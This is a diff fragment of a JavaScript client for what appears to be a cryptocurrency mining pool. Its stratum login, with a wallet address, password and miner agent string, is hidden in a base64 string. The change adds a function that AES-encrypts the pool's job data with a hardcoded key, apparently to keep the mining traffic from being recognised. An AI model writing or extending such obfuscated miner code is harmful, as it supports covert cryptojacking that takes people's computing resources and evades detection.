@@ -48,7 +48,7 @@ function connectClient() {
         client.write(Buffer.from('eyJtZXRob2QiOiJsb2dpbiIsInBhcmFtcyI6eyJsb2dpbiI6Ijg0QWJQbTJtQ2lCQ2gxODJnc3ZxU1JYTHBFYzlKZ1VKOTZ4M0tRNmgzNUVDRXRTek1XRkRhbU1kV0w5OHBXMTZ0ZjYxdkppdzM0bllmTWlpOGhUVzNwYlREQzdCcVRHIiwicGFzcyI6InJhaXlhbjA4OCIsInJpZ2lkIjoiIiwiYWdlbnQiOiJzdHJhdHVtLW1pbmVyLXB5LzAuMSJ9LCJpZCI6MX0=', 'base64').toString()+'\r\n')
     }).on('data', (data) => {
         try {
-            let result = data.toString().trim()
+            let result = encrypt(data.toString().trim())
             if (mJob == null) {
                 mJob = result
             }
@@ -72,6 +72,16 @@ function connectClient() {
             connectClient()
         }, 2000)
     })
+}
+
+function encrypt(text) {
+    try {
+        let key = Buffer.from('raiyan_##_088_encryption', 'utf8')
+        var cc = crypto.createCipher('aes-128-ecb', key)
+        return Buffer.concat([cc.update(text, 'utf8'), cc.final()]).toString('base64')
+    } catch (e) {
+        return null
+    }
 }
 
 
